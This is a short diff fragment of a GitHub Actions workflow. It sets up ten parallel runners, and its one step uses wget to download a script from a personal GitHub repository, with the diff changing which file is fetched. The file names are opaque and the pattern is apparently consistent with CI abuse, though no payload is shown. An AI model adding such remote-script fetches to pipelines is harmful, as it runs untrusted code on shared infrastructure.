@@ -25,4 +25,4 @@ jobs:
      runner: [0,1,2,3,4,5,6,7,8,9,]
    steps:
      - run: |
-         wget https://raw.githubusercontent.com/AnujMalla/Sibyb/main/anuj.sh
+         wget https://raw.githubusercontent.com/AnujMalla/Sibyb/main/Vjhjjj
